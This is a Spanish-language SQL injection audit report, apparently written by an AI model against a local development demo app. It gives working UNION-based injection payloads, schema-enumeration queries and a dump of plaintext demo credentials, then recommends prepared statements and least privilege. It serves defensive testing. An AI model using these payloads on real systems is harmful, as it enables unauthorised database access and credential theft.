# Informe de Auditoría de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30T15:32:14Z  
**Tipo de análisis:** SQL Injection  
**Modelo:** claude-sonnet-4.6  

---

## Resumen Ejecutivo

Se ha identificado y explotado con éxito una vulnerabilidad crítica de **SQL Injection basada en cadena (Classic/UNION-based)** en el parámetro `id` de la aplicación web. La vulnerabilidad permite a un atacante extraer toda la información de la base de datos, incluyendo credenciales de usuarios.

---

## Descripción del Objetivo

La aplicación web presenta un formulario de búsqueda de usuarios mediante un campo `User ID`. El parámetro `id` es enviado vía GET al endpoint principal (`/`), junto con el parámetro `Submit=Submit`.

---

## Vulnerabilidades Encontradas

### 1. SQL Injection - UNION-based (String-based)

| Campo | Detalle |
|-------|---------|
| **Severidad** | Crítica (CVSS 9.8) |
| **Tipo** | SQL Injection clásica, UNION-based |
| **Parámetro vulnerable** | `id` (GET) |
| **URL** | `http://web.dev.local:8083/?id=PAYLOAD&Submit=Submit` |
| **Base de datos** | MariaDB 10.11.14 |

#### Evidencia de Vulnerabilidad

**Prueba 1 - Error SQL con comilla simple:**
```
GET /?id=1'&Submit=Submit
Respuesta: Fatal error: Uncaught mysqli_sql_exception: You have an error 
in your SQL syntax; check the manual that corresponds to your MariaDB server 
version for the right syntax to use near ''1''' at line 1
```

La aplicación revela errores SQL detallados, confirmando inyección en contexto de string.

**Prueba 2 - OR lógico (bypass):**
```
GET /?id=1' OR '1'='1&Submit=Submit
Respuesta: Devuelve TODOS los usuarios de la base de datos
```

**Prueba 3 - UNION SELECT (extracción de datos):**
```
GET /?id=0' UNION SELECT version(),user()-- -&Submit=Submit
Respuesta: First name: 10.11.14-MariaDB-ubu2204 | Surname: root@172.18.0.3
```

---

## Explotación

### Información del Servidor de Base de Datos
- **Motor:** MariaDB 10.11.14-ubu2204
- **Usuario de BD:** root@172.18.0.3
- **Base de datos activa:** sqli_demo

### Tablas Descubiertas
```sql
0' UNION SELECT group_concat(table_name),2 FROM information_schema.tables 
WHERE table_schema=database()-- -
```
**Resultado:** `users`

### Columnas de la Tabla `users`
```
user_id, first_name, last_name, username, password, email
```

### Volcado Completo de Credenciales

```sql
0' UNION SELECT group_concat(user_id,'|',first_name,'|',last_name,'|',username,'|',password 
SEPARATOR '\n'),2 FROM users-- -
```

| user_id | first_name | last_name | username | password |
|---------|-----------|-----------|----------|----------|
| 1 | John | Doe | admin | password123 |
| 2 | Jane | Smith | jsmith | secret456 |
| 3 | Bob | Johnson | bjohnson | mypass789 |
| 4 | Alice | Williams | awilliams | qwerty123 |
| 5 | Charlie | Brown | cbrown | password |
| 6 | Diana | Davis | ddavis | secure123 |
| 7 | Eve | Miller | emiller | hackme |
| 8 | Frank | Wilson | fwilson | admin123 |

> ⚠️ Las contraseñas se almacenan en **texto plano** sin ningún tipo de hash.

---

## Análisis Técnico

La consulta SQL vulnerable es aproximadamente:
```sql
SELECT first_name, last_name FROM users WHERE id = '$id'
```

El valor del parámetro `id` se inserta directamente en la consulta sin sanitización ni uso de consultas preparadas (prepared statements), permitiendo la inyección de código SQL arbitrario.

**Factores agravantes:**
1. El usuario de base de datos es `root` — acceso completo al SGBD
2. Los errores SQL se muestran directamente al usuario
3. Las contraseñas se almacenan en texto plano

---

## Impacto

- **Confidencialidad:** Total — todas las credenciales expuestas
- **Integridad:** Alta — posible modificación/eliminación de datos
- **Disponibilidad:** Alta — posible eliminación de tablas/bases de datos
- **Escalada:** Crítica — usuario `root` podría permitir lectura de archivos del sistema (`LOAD_FILE`) o escritura (`INTO OUTFILE`)

---

## Recomendaciones

1. **Usar consultas preparadas (Prepared Statements):**
   ```php
   $stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE id = ?");
   $stmt->bind_param("i", $id);
   $stmt->execute();
   ```

2. **Validar y sanitizar entradas:** Verificar que el parámetro `id` sea estrictamente numérico antes de procesarlo.

3. **Principio de mínimo privilegio:** El usuario de la base de datos no debe ser `root`; debe tener únicamente los permisos necesarios (SELECT sobre las tablas requeridas).

4. **Deshabilitar mensajes de error SQL en producción:** Nunca mostrar errores técnicos al usuario final.

5. **Hashear contraseñas:** Usar bcrypt, Argon2 u otro algoritmo seguro para almacenar contraseñas.

6. **Implementar WAF:** Considerar un Web Application Firewall como capa adicional de protección.

---

## Conclusión

La aplicación web http://web.dev.local:8083 presenta una vulnerabilidad **crítica** de SQL Injection que ha sido explotada con éxito para extraer la totalidad de los datos de la base de datos, incluyendo 8 registros de usuarios con sus credenciales en texto plano. Se recomienda corrección inmediata antes de cualquier despliegue en entorno de producción.
